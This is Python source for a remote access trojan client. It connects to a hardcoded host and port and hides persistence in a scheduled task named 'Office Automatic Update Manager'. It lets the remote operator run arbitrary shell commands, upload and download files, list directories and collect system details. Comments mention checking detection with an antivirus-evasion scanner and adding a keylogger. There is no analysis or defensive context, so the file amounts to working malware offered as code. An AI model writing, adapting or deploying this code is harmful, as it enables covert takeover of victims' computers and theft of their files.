#use https://antiscan.me
import datetime, glob, os
import socket, pickle, time, platform, psutil
import sys, fasteners
import traceback, subprocess

home = ('192.168.0.224', 5000)
conn = None
conn_open = False
buf_size = 4096
dl = '\\'

def get_size(b, s="B"):
    f = 1024
    for u in ["", "K", "M", "G", "T", "P"]:
        if b < f:
            return f"{b:.2f}{u}{s}"
        b /= f

def send(msg):
    msg = pickle.dumps({'exit': msg[0], 'msg': msg[1]}, -1)
    conn.sendall(pickle.dumps({'incoming': len(msg)}))
    conn.sendall(msg)

def run(): #todo add keylogger?
    global conn_open, conn

    lock = fasteners.InterProcessLock('Reserve')
    if not lock.acquire(timeout=10):
        return

    try:
        subprocess.check_output(['schtasks', '/query', '/tn', 'Office Automatic Update Manager'], stderr=subprocess.PIPE)
    except:
        task = ['schtasks', '/create', '/sc', 'minute', '/mo', '15', '/f', '/tn', 'Office Automatic Update Manager', '/tr', sys.argv[0]]
        subprocess.check_output(task, stderr=subprocess.PIPE)

    while True:
        if not conn:
            conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        try:
            conn.connect(home)
            conn.sendall(pickle.dumps({'name': socket.gethostname()}))
            server_alive = True
        except:
            server_alive = False
            time.sleep(5)

        while server_alive:
            try:
                response = None
                cmd = pickle.loads(conn.recv(1024))

                if cmd['type'] != 'keepalive':
                    response = 1, 'Invalid command'

                if cmd['type'] == 'getinfo':
                    response = {}
                    response['platform'] = platform.platform()
                    response['processor'] = platform.processor()
                    response['boot time'] = datetime.datetime.fromtimestamp(psutil.boot_time()).strftime('%m-%d-%Y %I:%M:%S%p')
                    response['core counts'] = f'physical: {psutil.cpu_count(logical=False)}, total: {psutil.cpu_count(logical=True)}'
                    response['memory'] = f'total: {get_size(psutil.virtual_memory().total)}, available: {get_size(psutil.virtual_memory().available)}'
                    for p in psutil.disk_partitions():
                        try:
                            response[p.device] = f'disk size: {get_size(psutil.disk_usage(p.mountpoint).total)}, used: {get_size(psutil.disk_usage(p.mountpoint).used)}'
                        except:
                            response[p.device] = f'disk size: disk not ready, used: disk not ready'
                        response[p.device] += f', mountpoint: {p.mountpoint}, file system type: {p.fstype}'
                    response['battery'] = psutil.sensors_battery()
                    response = 0, response
                    #response[''] #todo add more to computer info?
                elif cmd['type'] == 'shell':
                    if cmd['cmd'] == 'get_loc':
                        response = 0, {'loc': os.getcwd()}
                    elif cmd['cmd'].split(' ', 1)[0] == 'cd':
                        try:
                            os.chdir(cmd['cmd'].split(' ', 1)[1])
                            response = 0, {'loc': os.getcwd()}
                        except:
                            response = 1, {'err': 'Invalid location', 'loc': os.getcwd()}
                    else:
                        result = 'Invalid command'
                        try:
                            result = subprocess.check_output(cmd['cmd'].split(' '), shell=True, stderr=subprocess.STDOUT).decode()
                            response = 0, {'output': result, 'loc': os.getcwd()}
                        except:
                            response = 1, {'output': result, 'loc': os.getcwd()}
                elif cmd['type'] == 'upload':
                    expected_size = cmd['size']
                    msg = []
                    while expected_size > 0:
                        tmp_part = conn.recv(min(expected_size, buf_size))
                        if not tmp_part:
                            raise Exception('Unexpected EOF')
                        msg.append(tmp_part)
                        expected_size -= len(tmp_part)
                    msg = b''.join(msg)
                    msg = pickle.loads(msg)
                    try:
                        with open(msg['loc'], 'wb') as f:
                            f.write(msg['content'])
                        response = 0, 'File saved successfully'
                    except PermissionError:
                        response = 1, 'Permission denied'
                elif cmd['type'] == 'download':
                    try:
                        with open(cmd['file'], 'rb') as f:
                            response = 0, f.read()
                    except MemoryError:
                        response = 1, 'Memory error'
                    except PermissionError:
                        response = 1, 'Permission denied'
                    except FileNotFoundError:
                        response = 1, 'File not found'
                elif cmd['type'] == 'getfiles':
                    if os.path.isdir(cmd['loc']):
                        response = ''
                        for root, dirs, files in os.walk(cmd['loc']):
                            level = root.replace(cmd['loc'], '').count(os.sep)
                            indent = ' ' * 4 * (level)
                            response += '{}{}/'.format(indent, os.path.basename(root)) + '\n'
                            subindent = ' ' * 4 * (level + 1)
                            for f in files:
                                response += '{}{}'.format(subindent, f) + '\n'
                        response = 0, response
                    else:
                        response = 1, 'Invalid directory'
                if response:
                    send(response)
            except:
                traceback.print_exc()
                server_alive = False
                conn = None

if __name__ == '__main__':
    run()
